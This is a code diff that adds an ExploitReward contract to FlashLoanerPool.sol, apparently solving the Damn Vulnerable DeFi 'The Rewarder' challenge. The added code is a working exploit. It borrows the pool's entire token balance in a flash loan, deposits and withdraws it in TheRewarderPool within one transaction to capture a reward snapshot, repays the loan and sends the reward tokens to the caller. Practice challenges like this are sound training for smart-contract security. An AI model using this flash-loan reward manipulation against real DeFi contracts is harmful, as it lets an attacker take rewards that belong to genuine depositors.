@@ -4,6 +4,8 @@ pragma solidity 0.8.17;
 import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
 import {Address} from "openzeppelin-contracts/utils/Address.sol";
 import {DamnValuableToken} from "../DamnValuableToken.sol";
+import {TheRewarderPool} from "./TheRewarderPool.sol";
+import {RewardToken} from "./RewardToken.sol";
 
 /**
  * @title FlashLoanerPool
@@ -35,5 +37,33 @@ contract FlashLoanerPool is ReentrancyGuard {
         if (liquidityToken.balanceOf(address(this)) < balanceBefore) {
             revert FlashLoanHasNotBeenPaidBack();
         }
+    }
+}
+
+contract ExploitReward {
+    FlashLoanerPool public pool;
+    DamnValuableToken public token;
+    TheRewarderPool public rewardPool;
+    RewardToken public reward;
+
+    constructor(address _pool, address _token, address _rewardPool, address _reward) {
+        pool = FlashLoanerPool(_pool);
+        token = DamnValuableToken(_token);
+        rewardPool = TheRewarderPool(_rewardPool);
+        reward = RewardToken(_reward);
+    }
+
+    fallback() external {
+        uint256 bal = token.balanceOf(address(this));
+        token.approve(address(rewardPool), bal);
+        rewardPool.deposit(bal);
+        rewardPool.withdraw(bal);
+
+        token.transfer(address(pool), bal);
+    }
+
+    function attack() external {
+        pool.flashLoan((token.balanceOf(address(pool))));
+        reward.transfer(msg.sender, reward.balanceOf(address(this)));
     }
 }
